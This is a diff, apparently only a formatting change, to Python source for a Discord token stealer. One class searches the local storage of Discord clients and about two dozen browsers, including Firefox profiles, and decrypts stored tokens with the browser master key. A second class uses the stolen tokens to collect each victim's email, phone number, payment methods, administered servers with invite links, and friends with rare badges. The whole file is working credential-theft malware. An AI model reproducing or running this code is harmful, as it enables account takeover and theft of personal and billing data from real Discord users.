@@ -31,37 +31,57 @@ class extract_tokens:
 
     def extract(self) -> None:
         # Instafail if not set
-        if not self.appdata or not self.roaming: 
+        if not self.appdata or not self.roaming:
             return
-        
+
         paths = {
-            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
-            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
-            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
-            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
-            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
-            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+            "Discord": self.roaming + "\\discord\\Local Storage\\leveldb\\",
+            "Discord Canary": self.roaming
+            + "\\discordcanary\\Local Storage\\leveldb\\",
+            "Lightcord": self.roaming + "\\Lightcord\\Local Storage\\leveldb\\",
+            "Discord PTB": self.roaming + "\\discordptb\\Local Storage\\leveldb\\",
+            "Opera": self.roaming
+            + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
+            "Opera GX": self.roaming
+            + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
+            "Amigo": self.appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
+            "Torch": self.appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
+            "Kometa": self.appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
+            "Orbitum": self.appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
+            "CentBrowser": self.appdata
+            + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
+            "7Star": self.appdata
+            + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
+            "Sputnik": self.appdata
+            + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
+            "Vivaldi": self.appdata
+            + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
+            "Chrome SxS": self.appdata
+            + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
+            "Chrome": self.appdata
+            + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
+            "Chrome1": self.appdata
+            + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
+            "Chrome2": self.appdata
+            + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
+            "Chrome3": self.appdata
+            + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
+            "Chrome4": self.appdata
+            + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
+            "Chrome5": self.appdata
+            + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
+            "Epic Privacy Browser": self.appdata
+            + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
+            "Microsoft Edge": self.appdata
+            + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
+            "Uran": self.appdata
+            + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
+            "Yandex": self.appdata
+            + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
+            "Brave": self.appdata
+            + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
+            "Iridium": self.appdata
+            + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
         }
 
         for name, path in paths.items():
@@ -69,21 +89,30 @@ class extract_tokens:
                 continue
             _discord = name.replace(" ", "").lower()
             if "cord" in path:
-                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
+                if not os.path.exists(self.roaming + f"\\{_discord}\\Local State"):
                     continue
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for line in [
+                        x.strip()
+                        for x in open(
+                            f"{path}\\{file_name}", errors="ignore"
+                        ).readlines()
+                        if x.strip()
+                    ]:
                         for y in re.findall(self.regexp_enc, line):
                             token = self.decrypt_val(
-                                base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), 
-                                self.get_master_key(self.roaming+f'\\{_discord}\\Local State')
+                                base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
+                                self.get_master_key(
+                                    self.roaming + f"\\{_discord}\\Local State"
+                                ),
                             )
 
                             if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={
-                                                   'Authorization': token}).json()['id']
+                                uid = requests.get(
+                                    self.base_url, headers={"Authorization": token}
+                                ).json()["id"]
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
@@ -92,32 +121,46 @@ class extract_tokens:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for line in [
+                        x.strip()
+                        for x in open(
+                            f"{path}\\{file_name}", errors="ignore"
+                        ).readlines()
+                        if x.strip()
+                    ]:
                         for token in re.findall(self.regexp, line):
                             if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={
-                                                   'Authorization': token}).json()['id']
+                                uid = requests.get(
+                                    self.base_url, headers={"Authorization": token}
+                                ).json()["id"]
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
 
-        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(
+                self.roaming + "\\Mozilla\\Firefox\\Profiles"
+            ):
                 for _file in files:
-                    if not _file.endswith('.sqlite'):
+                    if not _file.endswith(".sqlite"):
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                    for line in [
+                        x.strip()
+                        for x in open(f"{path}\\{_file}", errors="ignore").readlines()
+                        if x.strip()
+                    ]:
                         for token in re.findall(self.regexp, line):
                             if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={
-                                                   'Authorization': token}).json()['id']
+                                uid = requests.get(
+                                    self.base_url, headers={"Authorization": token}
+                                ).json()["id"]
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
 
     def validate_token(self, token: str) -> bool:
         print(token)
-        r = requests.get(self.base_url, headers={'Authorization': token})
+        r = requests.get(self.base_url, headers={"Authorization": token})
 
         if r.status_code == 200:
             return True
@@ -137,7 +180,7 @@ class extract_tokens:
         if not os.path.exists(path):
             return None
 
-        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
+        if "os_crypt" not in open(path, "r", encoding="utf-8").read():
             return None
 
         with open(path, "r", encoding="utf-8") as f:
@@ -160,131 +203,147 @@ class upload_tokens:
             "DISCORD_EMPLOYEE": {
                 "emoji": "<:staff:968704541946167357>",
                 "shift": 0,
-                "ind": 1
+                "ind": 1,
             },
             "DISCORD_PARTNER": {
                 "emoji": "<:partner:968704542021652560>",
                 "shift": 1,
-                "ind": 2
+                "ind": 2,
             },
             "HYPESQUAD_EVENTS": {
                 "emoji": "<:hypersquad_events:968704541774192693>",
                 "shift": 2,
-                "ind": 4
+                "ind": 4,
             },
             "BUG_HUNTER_LEVEL_1": {
                 "emoji": "<:bug_hunter_1:968704541677723648>",
                 "shift": 3,
-                "ind": 4
+                "ind": 4,
             },
             "HOUSE_BRAVERY": {
                 "emoji": "<:hypersquad_1:968704541501571133>",
                 "shift": 6,
-                "ind": 64
+                "ind": 64,
             },
             "HOUSE_BRILLIANCE": {
                 "emoji": "<:hypersquad_2:968704541883261018>",
                 "shift": 7,
-                "ind": 128
+                "ind": 128,
             },
             "HOUSE_BALANCE": {
                 "emoji": "<:hypersquad_3:968704541874860082>",
                 "shift": 8,
-                "ind": 256
+                "ind": 256,
             },
             "EARLY_SUPPORTER": {
                 "emoji": "<:early_supporter:968704542126510090>",
                 "shift": 9,
-                "ind": 512
+                "ind": 512,
             },
             "BUG_HUNTER_LEVEL_2": {
                 "emoji": "<:bug_hunter_2:968704541774217246>",
                 "shift": 14,
-                "ind": 16384
+                "ind": 16384,
             },
             "VERIFIED_BOT_DEVELOPER": {
                 "emoji": "<:verified_dev:968704541702905886>",
                 "shift": 17,
-                "ind": 131072
+                "ind": 131072,
             },
             "ACTIVE_DEVELOPER": {
                 "emoji": "<:Active_Dev:1045024909690163210>",
                 "shift": 22,
-                "ind": 4194304
+                "ind": 4194304,
             },
             "CERTIFIED_MODERATOR": {
                 "emoji": "<:certified_moderator:988996447938674699>",
                 "shift": 18,
-                "ind": 262144
+                "ind": 262144,
             },
-            "SPAMMER": {
-                "emoji": "⌨",
-                "shift": 20,
-                "ind": 1048704
-            },
+            "SPAMMER": {"emoji": "⌨", "shift": 20, "ind": 1048704},
         }
 
-        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
+        return [
+            [flags_dict[flag]["emoji"], flags_dict[flag]["ind"]]
+            for flag in flags_dict
+            if int(flags) & (1 << flags_dict[flag]["shift"])
+        ]
 
     def get_data(self) -> dict[str, Any]:
         if not self.tokens:
             return {}
-        
+
         res = {}
 
         for token in self.tokens:
             user = requests.get(
-                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
+                "https://discord.com/api/v8/users/@me", headers={"Authorization": token}
+            ).json()
             billing = requests.get(
-                'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
+                "https://discord.com/api/v6/users/@me/billing/payment-sources",
+                headers={"Authorization": token},
+            ).json()
             guilds = requests.get(
-                'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
+                "https://discord.com/api/v9/users/@me/guilds?with_counts=true",
+                headers={"Authorization": token},
+            ).json()
             friends = requests.get(
-                'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
+                "https://discord.com/api/v8/users/@me/relationships",
+                headers={"Authorization": token},
+            ).json()
 
-            username = user['username'] + '#' + user['discriminator']
-            user_id = user['id']
-            email = user['email']
-            phone = user['phone']
-            mfa = user['mfa_enabled']
-            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(
-                f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
-            badges = ' '.join([flag[0]
-                              for flag in self.calc_flags(user['public_flags'])])
+            username = user["username"] + "#" + user["discriminator"]
+            user_id = user["id"]
+            email = user["email"]
+            phone = user["phone"]
+            mfa = user["mfa_enabled"]
+            avatar = (
+                f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif"
+                if requests.get(
+                    f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif"
+                ).status_code
+                == 200
+                else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
+            )
+            badges = " ".join(
+                [flag[0] for flag in self.calc_flags(user["public_flags"])]
+            )
 
-            if user['premium_type'] == 0:
-                nitro = 'None'
-            elif user['premium_type'] == 1:
-                nitro = 'Nitro Classic'
-            elif user['premium_type'] == 2:
-                nitro = 'Nitro'
-            elif user['premium_type'] == 3:
-                nitro = 'Nitro Basic'
+            if user["premium_type"] == 0:
+                nitro = "None"
+            elif user["premium_type"] == 1:
+                nitro = "Nitro Classic"
+            elif user["premium_type"] == 2:
+                nitro = "Nitro"
+            elif user["premium_type"] == 3:
+                nitro = "Nitro Basic"
             else:
-                nitro = 'None'
+                nitro = "None"
 
             payment_methods = []
 
             for method in billing:
-                if method['type'] == 1:
-                    payment_methods.append('credit_card')
+                if method["type"] == 1:
+                    payment_methods.append("credit_card")
 
-                elif method['type'] == 2:
+                elif method["type"] == 2:
                     payment_methods.append("paypal")
 
                 else:
-                    payment_methods.append('unknown')
+                    payment_methods.append("unknown")
 
             hq_guilds = []
             for guild in guilds:
                 # Note that we unconditionally get data for all servers/guilds,
-                # because we wouldn't have that much data on test accounts 
+                # because we wouldn't have that much data on test accounts
                 # otherwise.
-                admin = True if guild['permissions'] == '4398046511103' else False
-                
+                admin = True if guild["permissions"] == "4398046511103" else False
+
                 invites = requests.get(
-                    f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
-                
+                    f"https://discord.com/api/v8/guilds/{guild['id']}/invites",
+                    headers={"Authorization": token},
+                ).json()
+
                 # lol
                 if len(invites) > 0:
                     invite = f"https://discord.gg/{invites[0]['code']}"
@@ -292,13 +351,13 @@ class upload_tokens:
                     invite = "https://youtu.be/dQw4w9WgXcQ"
 
                 data = {
-                    'name': guild['name'],
-                    'id': guild['id'],
-                    'is_admin': admin,
-                    'is_owner': guild['owner'],
-                    'member_count': guild['approximate_member_count'],
-                    'active_count': guild['approximate_presence_count'],
-                    'invite': invite
+                    "name": guild["name"],
+                    "id": guild["id"],
+                    "is_admin": admin,
+                    "is_owner": guild["owner"],
+                    "member_count": guild["approximate_member_count"],
+                    "active_count": guild["approximate_presence_count"],
+                    "invite": invite,
                 }
 
                 hq_guilds.append(data)
@@ -306,18 +365,26 @@ class upload_tokens:
             hq_friends = []
             for friend in friends:
                 unprefered_flags = [64, 128, 256, 1048704]
-                inds = [flag[1] for flag in self.calc_flags(
-                    friend['user']['public_flags'])[::-1]]
+                inds = [
+                    flag[1]
+                    for flag in self.calc_flags(friend["user"]["public_flags"])[::-1]
+                ]
                 for flag in unprefered_flags:
                     inds.remove(flag) if flag in inds else None
                 if inds != []:
-                    hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
-                        friend['user']['public_flags'])[::-1]])
+                    hq_badges = " ".join(
+                        [
+                            flag[0]
+                            for flag in self.calc_flags(friend["user"]["public_flags"])[
+                                ::-1
+                            ]
+                        ]
+                    )
 
                     data = {
-                        'badges': hq_badges,
-                        'username': friend['user']['username'],
-                        'id': friend['user']['id']
+                        "badges": hq_badges,
+                        "username": friend["user"]["username"],
+                        "id": friend["user"]["id"],
                     }
 
                     hq_friends.append(data)
@@ -333,7 +400,7 @@ class upload_tokens:
                 "email": email,
                 "phone": phone,
                 "guild_data": hq_guilds,
-                "friend_data": hq_friends
+                "friend_data": hq_friends,
             }
-        
+
         return res
